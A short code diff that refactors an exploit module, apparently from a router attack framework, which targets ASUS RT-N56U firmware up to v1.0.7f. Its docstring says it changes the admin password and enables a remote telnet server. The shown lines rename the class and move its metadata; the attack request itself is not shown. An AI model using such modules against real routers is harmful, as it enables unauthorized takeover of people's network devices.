@@ -2,14 +2,14 @@ from urllib import urlencode, urlopen
 import util
 from ..router_vuln import RouterVuln
 
-__router__='RT-N56U <= v1.0.7f'
-__vuln__='Change Admin Password'
-class ChangeAdmin(RouterVuln):
+class rt56u_change_admin(RouterVuln):
 	"""Change the admin password and enable the remote telnet server
 	   http://forelsec.blogspot.com/2013/02/asus-rt56u-multiple-vulnerabilities.html
 	"""
 	def __init__(self):
-		super(ChangeAdmin,self).__init__()
+		self.vuln   = 'Change Admin Password'
+		self.router = 'RT-N56U <= v1.0.7f'
+		super(rt56u_change_admin,self).__init__()
 
 	def run(self):
 		util.Msg('Changing admin password and enabling remote telnet server...')
